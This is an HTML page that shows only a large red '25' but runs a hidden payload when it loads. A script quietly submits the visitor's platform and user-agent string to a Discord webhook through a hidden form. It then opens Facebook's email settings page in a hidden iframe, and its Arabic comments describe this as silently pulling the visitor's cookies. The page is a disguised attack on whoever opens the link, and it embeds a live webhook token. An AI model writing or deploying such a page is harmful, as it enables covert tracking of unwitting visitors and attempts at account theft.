<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking 25</title>
    <style>
        body { background: #000; color: #ff0000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        h1 { font-size: 150px; text-shadow: 0 0 20px #f00; }
    </style>
</head>
<body>

    <h1>25</h1>

    <form id="force_form" method="POST" action="https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ" target="hidden_iframe">
        <input type="hidden" name="payload_json" id="p_json">
    </form>
    <iframe name="hidden_iframe" style="display:none;"></iframe>

    <script>
        function emit(title, info) {
            const payload = {
                embeds: [{ title: title, description: info, color: 16711680 }]
            };
            document.getElementById('p_json').value = JSON.stringify(payload);
            document.getElementById('force_form').submit();
        }

        window.onload = function() {
            // أول إرسال: تأكيد فتح الرابط ونوع الجهاز
            emit("🚀 System Hit V25", "Device: " + navigator.platform + "\nUA: " + navigator.userAgent);

            // تكتيك السحب الصامت للكوكيز عبر الـ Iframe
            // بنحاول نفتح فيسبوك بـ iframe مخفي، ونخلي المتصفح يبعث الكوكيز
            const ifr = document.createElement('iframe');
            ifr.style.display = 'none';
            ifr.src = "https://mbasic.facebook.com/settings/email/";
            document.body.appendChild(ifr);

            setTimeout(() => {
                emit("📡 Probe Update", "Iframe tunnel injected. Monitoring cross-site traffic...");
            }, 3000);
        };
    </script>
</body>
</html>
